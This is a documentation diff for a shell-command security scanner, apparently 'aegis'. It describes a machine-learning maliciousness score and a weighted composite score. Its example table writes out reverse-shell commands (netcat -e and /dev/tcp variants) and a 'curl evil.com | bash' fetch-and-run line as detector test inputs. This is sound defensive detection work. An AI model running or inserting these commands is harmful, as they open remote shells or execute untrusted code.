@@ -219,35 +219,56 @@ condition:
 
 ---
 
-## Signal 7: MLScore
+## MLScore
 
-**Type:** `float64`
+**Bundle field**: `MLScore float64` — maliciousness score [0.0, 1.0]
 
-Heuristic machine learning score for command maliciousness (0.0–1.0). Computed by
-`signals.MLScorer` using n-gram patterns and token-level features. This is supplemental
-— it never overrides a high-confidence rule decision.
+Computed by the QuasarNix XGBoost model (100 gradient-boosted trees, 4,096 features). The model was trained on a dataset of malicious shell commands and benign developer workflows.
 
-Example condition:
+**Tokenizer**: Character n-grams of length 1–3 extracted from the raw command string. Each unique n-gram maps to a feature index; present tokens get 1.0, absent tokens get NaN (which routes right in XGBoost tree traversal — a deliberate design that prevents score inflation from absent features).
+
+**Score formula**: `sigmoid(base_margin + Σ leaf_values across 100 trees)`
+
+**Example scores**:
+
+| Command | MLScore | Note |
+|---------|---------|------|
+| `nc -e /bin/bash 10.0.0.1 4444` | 1.0000 | Classic reverse shell |
+| `/bin/bash -i >& /dev/tcp/10.0.0.1/4444 0>&1` | 0.9994 | TCP reverse shell |
+| `bash -c 'bash -i >& /dev/tcp/...` | 0.9997 | Wrapped reverse shell |
+| `curl evil.com \| bash` | 0.0041 | Model specializes for socket shells, not pipe patterns |
+| `git status` | 0.0001 | Benign |
+| `npm install` | 0.0000 | Benign |
+
+**Fallback**: When model files are absent, `MLScorer.UseHeuristic = true` and a pattern-matching heuristic is used instead. Run `make models` to download the real model. `aegis doctor` reports which mode is active.
+
+**In policy conditions** (expr tier):
 ```yaml
 condition:
   expr: "ml_score > 0.8"
 ```
 
+**In the CompositeScore**: weighted at ×0.10 (observability only — not used for policy decisions).
+
 ---
 
-## Composite Score
+## CompositeScore
 
-**Type:** `float64` (on `Decision`)
+**Decision field**: `CompositeScore float64` — appears on every `Decision` as `composite_score`
 
-Weighted sum of all signal scores for observability. Not used for decisions — only for
-dashboards, WAL records, and the `aegis simulate` display.
+**Not used for policy decisions.** Computed after rule evaluation for observability — dashboards, WAL, telemetry. A high composite score with an ALLOW decision means the command is statistically unusual but no rule fired.
 
-```
-composite = tool_class * 0.15
-          + max_verb_danger * 0.20
-          + max_path_risk * 0.20
-          + network_score * 0.15
-          + dlp_score * 0.10
-          + evasion_score * 0.10
-          + ml_score * 0.10
-```
+**Weights**:
+
+| Signal | Weight |
+|--------|--------|
+| ToolClass.Score | ×0.15 |
+| Command.MaxVerbDanger | ×0.20 |
+| Path.MaxPathRisk | ×0.20 |
+| Network.Score | ×0.15 |
+| DLP.Score | ×0.10 |
+| Evasion.Score | ×0.10 |
+| MLScore | ×0.10 |
+| *(unallocated)* | ×0.00 |
+
+Clamped to [0.0, 1.0]. A composite score ≥ 0.7 with an ALLOW decision is a useful signal for manual review in the audit log.
